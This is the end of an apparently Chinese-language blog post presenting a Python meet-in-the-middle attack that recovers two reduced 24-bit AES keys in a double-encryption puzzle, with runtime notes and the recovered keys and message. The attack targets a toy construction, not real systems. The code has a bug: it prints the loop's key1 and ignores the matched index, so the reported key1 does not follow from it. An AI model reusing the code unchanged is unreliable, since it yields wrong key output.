</span><span class='line'><span class="k">def</span> <span class="nf">aes_decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">):</span>
</span><span class='line'>    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">mode</span><span class="p">)</span>
</span><span class='line'>    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">plaintext</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">message1</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="s">&#39;QUVTLTI1NiBFQ0IgbW9kZSB0d2ljZSwgdHdvIGtleXM=&#39;</span><span class="p">)</span>     <span class="c"># &#39;AES-256 ECB mode twice, two keys&#39;</span>
</span><span class='line'>    <span class="n">ciphertext1</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="s">&#39;THbpB4bE82Rq35khemTQ10ntxZ8sf7s2WK8ErwcdDEc=&#39;</span><span class="p">)</span>  <span class="c"># &#39;\x4c\x76\xe9\x07\x86\xc4\xf3\x64\x6a\xdf\x99\x21\x7a\x64\xd0\xd7\x49\xed\xc5\x9f\x2c\x7f\xbb\x36\x58\xaf\x04\xaf\x07\x1d\x0c\x47&#39;</span>
</span><span class='line'>    <span class="c"># message2 = b64decode(&#39;RWFjaCBrZXkgemVybyB1bnRpbCBsYXN0IDI0IGJpdHM=&#39;)     # &#39;Each key zero until last 24 bits&#39;</span>
</span><span class='line'>    <span class="c"># ciphertext2 = b64decode(&#39;01YZbSrta2N+1pOeQppmPETzoT/Yqb816yGlyceuEOE=&#39;)  # &#39;\xd3\x56\x19\x6d\x2a\xed\x6b\x63\x7e\xd6\x93\x9e\x42\x9a\x66\x3c\x44\xf3\xa1\x3f\xd8\xa9\xbf\x35\xeb\x21\xa5\xc9\xc7\xae\x10\xe1&#39;</span>
</span><span class='line'>    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="s">&#39;s5hd0ThTkv1U44r9aRyUhaX5qJe561MZ16071nlvM9U=&#39;</span><span class="p">)</span>   <span class="c"># &#39;\xb3\x98\x5d\xd1\x38\x53\x92\xfd\x54\xe3\x8a\xfd\x69\x1c\x94\x85\xa5\xf9\xa8\x97\xb9\xeb\x53\x19\xd7\xad\x3b\xd6\x79\x6f\x33\xd5&#39;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">prefix</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span> <span class="o">*</span> <span class="mi">29</span>
</span><span class='line'>    <span class="n">clist</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>    <span class="n">mitms</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
</span><span class='line'>            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
</span><span class='line'>                <span class="n">key1</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span><span class='line'>                <span class="n">mitm1</span> <span class="o">=</span> <span class="n">aes_encrypt</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span> <span class="n">message1</span><span class="p">)</span>
</span><span class='line'>                <span class="n">mitms</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">mitm1</span><span class="p">)</span>
</span><span class='line'>    <span class="n">mitms_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">mitms</span><span class="p">)</span>  <span class="c"># convert to set for faster index</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
</span><span class='line'>            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
</span><span class='line'>                <span class="n">key2</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span><span class='line'>                <span class="n">anmitm1</span> <span class="o">=</span> <span class="n">aes_decrypt</span><span class="p">(</span><span class="n">key2</span><span class="p">,</span> <span class="n">ciphertext1</span><span class="p">)</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">anmitm1</span> <span class="ow">in</span> <span class="n">mitms_set</span><span class="p">:</span>
</span><span class='line'>                    <span class="n">key1_suffix</span> <span class="o">=</span> <span class="n">mitms</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">anmitm1</span><span class="p">)</span>
</span><span class='line'>                    <span class="k">print</span> <span class="s">&#39;key1: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">key1</span><span class="p">)</span>
</span><span class='line'>                    <span class="k">print</span> <span class="s">&#39;key2: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">key2</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">msg</span> <span class="o">=</span> <span class="n">aes_decrypt</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span> <span class="n">aes_decrypt</span><span class="p">(</span><span class="n">key2</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">))</span>
</span><span class='line'>                    <span class="k">print</span> <span class="s">&#39;message is: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">msg</span>
</span></code></pre></td></tr></table></div></figure>


<p>大概5分钟左右就跑完了，缓存key1的加密结果用了1.65G内存，如果内存不够，可以对key1分段跑，不过时间就要相应变长。</p>

<p>key1:</p>

<blockquote><p>\x9a\xe8\x07</p></blockquote>

<p>key2:</p>

<blockquote><p>\xff?E</p></blockquote>

<p>message is:</p>

<blockquote><p>This time I didn&rsquo;t include sol&#8217;n</p></blockquote>
]]></content>
  </entry>
  
</feed>
